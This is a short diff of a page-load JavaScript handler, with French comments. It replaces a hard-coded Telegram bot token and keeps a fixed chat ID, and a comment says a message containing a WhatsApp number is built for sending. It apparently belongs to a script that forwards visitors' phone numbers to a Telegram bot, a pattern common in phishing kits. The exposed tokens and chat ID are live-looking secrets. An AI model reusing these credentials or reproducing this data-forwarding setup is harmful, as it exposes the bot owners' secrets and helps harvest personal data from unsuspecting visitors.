@@ -40,7 +40,7 @@ document.addEventListener('DOMContentLoaded', function() {
         }
         
         // Configuration du bot Telegram
-        const botToken = '7738217538:AAHYGV5jXPv5L37QmHsJ7PbnBz8UhXYof2k';
+        const botToken = '7988940150:AAHQPLFP_VZH4xjV4aUhIZ3OZ31E7sf-Dm0';
         const chatId = '6804915795';
         
         // Créer le message à envoyer avec le numéro WhatsApp
